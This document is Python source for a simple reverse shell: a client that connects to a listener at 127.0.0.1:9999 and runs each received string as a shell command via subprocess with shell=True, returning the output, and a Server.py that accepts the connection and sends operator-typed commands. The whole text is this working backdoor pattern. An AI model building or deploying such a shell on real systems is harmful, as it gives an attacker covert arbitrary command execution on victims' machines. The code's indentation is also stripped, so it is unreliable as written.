import sys

import socket

import os

import subprocess

s = socket.socket() # creating a socket s

host = '127.0.0.1' # local host

port = 9999

s.connect((host, port)) # connecting to given host and port using created socket

while True:data = s.recv(1024) # Receiving 1024 bit data from server

if data[:2].decode('utf-8') == 'cd':os.chdir(data[3:].decode('utf-8'))

if len(data) > 0:  # running the accepted commands in the shell by creating a subprocess

cmd = subprocess.Popen(data[:].decode(

'utf-8'), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)

output_byte = cmd.stdout.read() + cmd.stderr.read() # printing all the output

output_str = str(output_byte, 'utf-8')

currentWD = os.getcwd() + '>'

s.send(str.encode(output_str + currentWD)) # sending data back to server

print(output_str)

Server.py

import socket

import os

import sys

host = '127.0.0.1'

port = 9999

# function to create a socket

def create_socket():

try:

global host

global port

global s

# host = ""

port = 9999

# Creating a new socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# AF_INET refers to the address family ipv4.

# The SOCK_STREAM means connection oriented TCP protocol.

except socket.error as msg:

print('Socket creation error: ' + str(msg))

# Binding socket and listen for connections



def bind_socket():

try:

global host

global port

global s

print('Binding the port' + str(port))

s.bind((host, port)) # binding the socket to given host and port

s.listen(5) # putting socket in listening mode for accepting incoming connections

except socket.error as msg:

print('Socket binding error' + str(msg) + '\n' + 'Retrying ...')

bind_socket()



# Establish connection with client

def socket_accept():

conn, address = s.accept() # Eastablishing connection with the client

print('Connection has been established |' + ' IP ' +

address[0] + ' | Port ' + str(address[1]))

send_commands(conn)

conn.close()

# Send command to client



def send_commands(conn):

while True:

cmd = input()

if cmd == 'quit':

conn.close()

s.close() # closing the socket

sys.exit()

if len(str.encode(cmd)) > 0:

conn.send(str.encode(cmd))

client_response = str(conn.recv(1024), 'utf-8')

print(client_response, end="")



def main():

create_socket()

bind_socket()

socket_accept()



main()
